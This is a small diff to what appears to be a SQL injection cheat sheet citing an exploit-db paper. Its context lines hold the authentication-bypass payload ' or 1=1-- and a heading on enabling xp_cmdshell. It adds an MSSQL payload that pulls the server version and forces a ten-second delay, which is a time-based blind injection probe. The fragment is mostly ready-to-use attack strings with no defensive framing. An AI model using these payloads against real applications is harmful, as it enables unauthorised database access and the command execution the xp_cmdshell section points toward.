@@ -88,6 +88,10 @@ https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-ap
 ```
 ' or 1=1--
 ```
+-> get version+delay
+```
+' SELECT @@version; WAITFOR DELAY '00:00:10'; —
+```
 
 -> Enable xp_cmdshell
 ```
